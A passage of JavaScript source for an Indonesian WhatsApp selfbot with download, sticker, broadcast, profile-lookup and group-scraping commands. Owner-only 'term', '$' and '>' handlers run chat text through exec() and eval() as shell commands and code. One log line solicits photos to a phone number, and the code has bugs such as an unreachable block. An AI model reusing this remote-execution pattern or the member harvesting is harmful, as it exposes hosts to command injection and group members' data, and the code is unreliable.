    		var ytresult = '';
    		ytresult += '「 *YOUTUBE SEARCH* 」'
    		ytresult += '\n________________________\n\n'
   			aramas.all.map((video) => {
        	ytresult += '❏ Title: ' + video.title + '\n'
            ytresult += '❏ Link: ' + video.url + '\n'
            ytresult += '❏ Durasi: ' + video.timestamp + '\n'
            ytresult += '❏ Upload: ' + video.ago + '\n________________________\n\n'
    		});
    		ytresult += '◩ *SELF-BOT*'
    		await fakethumb(tbuff,ytresult)
			break        
      case "toimg":
        if (!isQuotedSticker) return reply("𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !");
        reply(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await KonX.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".png");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return reply("Yah gagal, coba ulangi ^_^");
          buffer = fs.readFileSync(ran);
          fakethumb(buffer, `Ni Kak ${pushname}`);
          fs.unlinkSync(ran);
        });
        break;
        case 'tovid': 
        case 'tovideo':
            if (!isQuotedSticker) return reply('Reply stiker nya')
            if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.xtInfo

            media = await KonX.downloadAndSaveMediaMessage(encmedia)

            mik = await webp2gifFile(media)
            reply(mess.wait)
            console.log(mik)
            sendMediaURL(from, mik.result, 'Nih..')
            limitAdd(sender, limit)
            break
        case 'togif':
            if (!isQuotedSticker) return reply('Reply stiker nya')
            if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated == true)
            encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
            media = await KonX.downloadAndSaveMediaMessage(encmedia)
            mik = await webp2gifFile(media)
            reply(mess.wait)
            console.log(mik)
            anu = await getBuffer(mik.result)
            KonX.sendMessage(from, anu, video, {mimetype: 'video/gif', caption: 'Nih..', quoted: mek})
            break
      case "ytsearch":
        if (args.length < 1) return reply("Tolong masukan query!");
        var srch = args.join("");
        try {
          var aramas = await yts(srch);
        } catch {
          return await KonX.sendMessage(
            from,
            "Error!",
            MessageType.text,
            dload
          );
        }
        aramat = aramas.all;
        var tbuff = await getBuffer(aramat[0].image);
        var ytresult = "";
        ytresult += "「 *YOUTUBE SEARCH* 」";
        ytresult += "\n________________________\n\n";
        aramas.all.map((video) => {
          ytresult += "❏ Title: " + video.title + "\n";
          ytresult += "❏ Link: " + video.url + "\n";
          ytresult += "❏ Durasi: " + video.timestamp + "\n";
          ytresult +=
            "❏ Upload: " + video.ago + "\n________________________\n\n";
        });
        ytresult += "◩ *SELF-BOT*";
        await fakethumb(tbuff, ytresult);
        break;
      case "setreply":
      
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        fakegroup(`Succes Mengganti Conversation Fake : ${q}`);
        break;
      case "setfakeimg":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await KonX.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "setthumb":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await KonX.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "ytmp4":
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`);
        let isLinks2 = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks2) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          ytv(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 40000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captionsYtmp4);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
        case 'semoji':
			return reply('*Fitur Ini Masih Dalam Perbaikan*')
    	   break
      case "emoji":
        if (!q) return fakegroup("emojinya?");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        break;
      case "ytmp3":
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`);
        let isLinks = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          yta(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 30000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captions);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case 'bcbot': 
					if (!isOwner) return reply(mess.only.ownerB) 
					if (args.length < 1) return reply('.......')
					anu = await KonX.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await KonX.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							KonX.sendMessage(_.jid, bc, image, {quoted:mek,caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu) {
KonX.sendMessage(_.jid, 
			{"contentText": `*「 BROADCAST ${namabot} 」*\n\n${body.slice(4)}`,
			"footerText": 'Naufal',
			"buttons": [
			{"buttonId": `${prefix}menu`,
			"buttonText": {"displayText": "MENU BOT"
			},"type": "RESPONSE"}
			], "headerType": 1,
			}, MessageType.buttonsMessage )
}
             reply('Suksess broadcast')
}
             break
      case "brainly":
        if (args.length < 1) return reply("Pertanyaan apa");
        brien = args.join(" ");
        brainly(`${brien}`).then((res) => {
          teks = "❉───────────────────────❉\n";
          for (let Y of res.data) {
            teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`;
          }
          KonX.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;

      case "igstalk":
        if (!q) return fakegroup("Usernamenya?");
        ig.fetchUser(`${args.join(" ")}`).then((Y) => {
          console.log(`${args.join(" ")}`);
          ten = `${Y.profile_pic_url_hd}`;
          teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Followers* : ${Y.followers}\n*Following* : ${
            Y.following
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
          sendMediaURL(from, ten, teks);
        });
        break;
      case "fb":
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
        
      case "term":
      if (!mek.key.fromMe) return;
        if (!q) return fakegroup(mess.wrongFormat);
        exec(q, (err, stdout) => {
          if (err) return fakegroup(`Khusus Owner 🗿:~ ${err}`);
          if (stdout) {
            fakegroup(stdout);
          }
        });
        break;
      case "join":
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return reply("Masukan link group");
          var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
          if (!codeInvite) return fakegroup("pastikan link sudah mekar!");
          var response = await KonX.acceptInvite(codeInvite);
          grupinv("SUKSES");
        } catch {
          fakegroup("LINK ERROR!");
        }
        break;
      case "runtime":
      case "test":
        run = process.uptime();
        teks = `${kyun(run)}`;
        reply(teks);
        break;
      case "speed":
      case "ping":
        const timestamp = speed();
        const latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          const child = stdout.toString("utf-8");
          const ssd = child.replace(/Memory:/, "Ram:");
          const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
          reply(pingnya);
        });
        break;
    
      case "totag":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await KonX.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await KonX.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          KonX.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await KonX.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await KonX.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          KonX.sendMessage(from, ini_buffer, image, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedAudio) &&
          args.length == 0
        ) {
          encmedia = isQuotedAudio
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await KonX.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await KonX.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "audio/mp4",
            ptt: true,
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          KonX.sendMessage(from, ini_buffer, audio, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedVideo) &&
          args.length == 0
        ) {
          encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await KonX.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await KonX.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            mimetype: "video/mp4",
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          KonX.sendMessage(from, ini_buffer, video, options);
          fs.unlinkSync(file);
        } else {
          reply(
            `reply gambar/sticker/audio/video dengan caption ${prefix}totag`
          );
        }
        break;
      case "tomp4":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          ger = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await KonX.downloadAndSaveMediaMessage(ger);
          webp2mp4File(owgi).then((res) => {
            sendMediaURL(from, res.result, "Done");
          });
        } else {
          reply("reply stiker");
        }
        fs.unlinkSync(owgi);
        break;
      case "tourl":
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedVideo) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedVideo
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          owgi = await KonX.downloadMediaMessage(boij);
          res = await upload(owgi);
          reply(res);
        } else {
          reply("kirim/reply gambar/video");
        }
        break;
      case "inspect":
        try {
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          if (!q) return reply("masukan link wa");
          cos = args[0];
          var net = cos.split("https://chat.whatsapp.com/")[1];
          if (!net) return reply("pastikan itu link https://whatsapp.com/");
          jids = [];
          let {
            id,
            owner,
            subject,
            subjectOwner,
            desc,
            descId,
            participants,
            size,
            descOwner,
            descTime,
            creation,
          } = await KonX.query({
            json: ["query", "invite", net],
            expect200: true,
          });
          let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split("@")[0]}` : "*Owner* : -"}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : "*Desc* : tidak ada"}
*Id desc* : ${descId}
${
  descOwner
    ? `*Desc diubah oleh* : @${descOwner.split("@")[0]}`
    : "*Desc diubah oleh* : -"
}\n*Tanggal* : ${
            descTime ? `${formatDate(descTime * 1000)}` : "-"
          }\n\n*Kontak yang tersimpan*\n`;
          for (let y of participants) {
            par += `> @${y.id.split("@")[0]}\n*Admin* : ${
              y.isAdmin ? "Ya" : "Tidak"
            }\n`;
            jids.push(`${y.id.replace(/@c.us/g, "@s.whatsapp.net")}`);
          }
          jids.push(
            `${owner ? `${owner.replace(/@c.us/g, "@s.whatsapp.net")}` : "-"}`
          );
          jids.push(
            `${
              descOwner
                ? `${descOwner.replace(/@c.us/g, "@s.whatsapp.net")}`
                : "-"
            }`
          );
          KonX.sendMessage(from, par, text, {
            quoted: mek,
            contextInfo: { mentionedJid: jids },
          });
        } catch {
          reply("Link error");
        }
        break;
      case "eval":
        if (!mek.key.fromMe) return;
        KonX.sendMessage(
          from,
          JSON.stringify(eval(budy.slice(5)), null, "\t"),
          text,
          { quoted: mek }
        );
        break;
if (!mek.key.fromMe) return;
if (_chats.startsWith('$')){
if (!isOwner)return// reply(`Perintah ini tidak bisa Di lakukan oleh Jadibot sementara`)
if (!q)return 
var itsme = `${sender}`
var split = `*KonX-BotWeA*`
const term = {
contextInfo: {
participant: itsme,
quotedMessage: {
extendedTextMessage: {
text: split,
}
}
}
}
exec(q, (err, stdout) => {
if (err) return KonX.sendMessage(from, ` ${err}`, text, { quoted: mek })
if (stdout) {
KonX.sendMessage(from, stdout, text, term)
}
})
}

      default:
		if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Waktunya  Main botnya buat nanti lagi, Sebelum makan jangan lupa baca Doa ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'yellow'), color('(😊)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Udah sholat Subuh belum kak', 'yellow'), color('(🙄)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Pagi kak, Jangan lupa mandi nanti klo cewe pap ya:v kirim ke wa.me/62812-1208-3401', 'yellow'), color('(😅)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Siang kak, Dah mandi blm kak? klo udh pap ya kak (pap TT🗿)', 'yellow'), color('(🙄)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Sore kak, Jangan lupa mandi jan lupa pap ya', 'yellow'), color('(😅)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi keluar kak ayo semangat di itu nya🗿', 'yellow'), color('(🗿)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[Pesan Bot]', 'cyan'), color('Alhamdulillah, Dh magrib jan lupa sholat kak', 'yellow'), color('(😊)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('F', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(😄)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '02:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bot ngantuk kak, tidur dulu ya kak', 'yellow'), color('(😴)', 'white'))
        }

     if (!mek.key.fromMe) return;
        if (_chats.startsWith(">")) {
          try {
            return KonX.sendMessage(
              from,
              JSON.stringify(eval(budy.slice(2)), null, "\t"),
              text,
              { quoted: mek }
            );
          } catch (err) {
            e = String(err);
            reply(e);
          }
        }
    }

    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("[SELFBOT]", "red"),
        "Naufal & Akmal︎",
        color(sender.split("@")[0])
      );
    }
   } catch (e) {
    e = String(e);// Fixed Di Consolog 🌹
    if (!e.includes("this.isZero") && !e.includes("jid") && !e.includes("Cannot read property 'fromMe' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined") && !e.includes("Cannot read property 'key' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined")) {
      console.log("Message : %s", color(e, "yellow"));
    }
    // console.log(e)
  }
};
// 𝙈𝙚𝙣𝙜𝙜𝙖𝙗𝙪𝙩シ︎